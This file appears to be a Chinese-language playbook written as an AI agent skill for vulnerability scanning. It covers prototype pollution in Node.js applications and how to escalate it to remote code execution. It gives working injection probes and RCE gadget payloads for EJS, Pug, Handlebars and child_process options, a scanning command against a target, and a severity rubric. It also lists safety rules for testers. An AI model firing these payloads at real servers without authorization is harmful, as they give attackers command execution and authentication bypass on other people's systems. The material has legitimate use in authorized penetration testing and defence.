---
name: hunt-prototype-pollution
description: 原型链污染（Node.js/JS）到 RCE：__proto__/constructor 注入点、lodash.merge/Object.assign 危险合并、EJS/Pug/Handlebars gadget 链、污染验证与 RCE 收口
whenToUse: 目标是 Node.js/Express/Koa 应用，存在 JSON merge、对象深拷贝、配置合并、URL 参数解析成对象时
role: vuln-scan
enabled: true
---

# 原型链污染 → RCE

## 1. 原理

JS 对象属性查找会沿 `__proto__` 链上溯。若应用把用户输入合并进对象时未过滤 `__proto__` / `constructor.prototype`，就能污染 `Object.prototype`，影响**全进程**所有对象。

## 2. 危险入口

| 模式 | 说明 |
|---|---|
| `lodash.merge` / `_.defaultsDeep` | 老版本（<4.17.12）直接可打 |
| `Object.assign` + 嵌套 | 浅合并不污染，深合并污染 |
| `JSON.parse` + 递归赋值 | 自研 merge 函数常漏 |
| `qs` / `querystring` 解析成对象 | `?__proto__[x]=1` |
| 配置合并（`merge(defaults, userConfig)`） | 常见于初始化流程 |
| jQuery `$.extend(true, ...)` | 前端污染（可链 XSS） |

## 3. 注入探针

```json
{"__proto__": {"polluted": "yes"}}
```

```json
{"constructor": {"prototype": {"polluted": "yes"}}}
```

```
?__proto__[polluted]=yes
?constructor[prototype][polluted]=yes
```

**验证污染是否生效**（服务端无法直接看 `Object.prototype`，靠行为变化推断）：

| 观察点 | 说明 |
|---|---|
| 响应里出现意外字段 | 序列化时带出被污染属性 |
| 报错信息变化 | 污染 `toString` / `status` 改变错误输出 |
| 权限判断变化 | 污染 `isAdmin` / `role` 类属性 |
| 模板渲染行为变化 | 污染模板引擎配置 |

## 4. RCE gadget 链

污染本身只是「能改全局对象」，**要 RCE 必须借一个把属性当代码/命令用的 gadget**。

### 4.1 EJS

```json
{"__proto__": {"outputFunctionName": "x;process.mainModule.require('child_process').exec('id');s"}}
```

触发任意模板渲染即执行。EJS <3.1.7。

另有 `client: true` + `escapeFunction` 组合。

### 4.2 Pug / Jade

```json
{"__proto__": {"block": {"type": "Text", "line": "process.mainModule.require('child_process').exec('id')"}}}
```

### 4.3 Handlebars

```json
{"__proto__": {"allowedProtoMethods": {"toString": true}}}
```

配合模板里的 `{{#with ...}}` 触发。

### 4.4 child_process 选项污染

```json
{"__proto__": {"shell": "/proc/self/exe", "argv0": "node", "NODE_OPTIONS": "--require /proc/self/environ"}}
```

污染 `exec` 的 options 对象。

### 4.5 其它常见 gadget

| 库 | 属性 |
|---|---|
| `dot` / `doT` | `templateSettings` |
| `nunjucks` | `root` / `filters` |
| `lodash.template` | `sourceURL` |
| Express | `json spaces`（信息泄露）/ `view options` |

## 5. 探测工具

```bash
# 自动化探测
node brute-prototype-pollution.js -u https://TARGET -p payload.json
# 或 Burp 扩展 Server-Side Prototype Pollution Scanner
```

手工最小验证顺序：

1. 发 `{"__proto__":{"pptest":"1"}}` → 看响应是否变化
2. 换 `constructor.prototype` 再发
3. 确认污染后，逐个试 gadget
4. 命中 gadget 后，用**无副作用命令**（`id`、`sleep 3`）确认执行

## 6. 判定标准

| 现象 | 定性 |
|---|---|
| 污染确认 + gadget 执行命令（OAST/时间差） | **P0（RCE）** |
| 污染确认但无可用 gadget | P2（需结合具体依赖评估） |
| 权限判断被污染（`isAdmin`） | P0（鉴权绕过） |
| 仅前端（`$.extend`）污染 → XSS | P2 |
| 输入被过滤（`__proto__` 被删） | 不成立 |

## 7. 取证

- 命令执行证明用 `sleep 5` 时间差 或 `curl OAST`，**不用 `rm`/写文件**。
- 记录：完整请求体、污染前后的响应差异、命中的 gadget 与依赖版本。
- 落库 `category=rce` 或 `auth-bypass`。
- 与 `hunt-deserialization`（同属「对象注入」大类）、`hunt-rce` 联动。

## 8. 不要做的事

- 禁：用破坏性命令验证 RCE。
- 禁：污染后不重启就离开（污染是进程级的，可能让后续用户行为异常）—— 测试完提示重启。
- 禁：在共享生产实例上反复污染。
- 禁：把 gadget payload 直接打进真实用户会触发的路径。

<!-- 改编自: src-hunter references/playbooks/rce/17-prototype-pollution.md + PayloadsAllTheThings/Prototype Pollution, 2026-11-01 -->
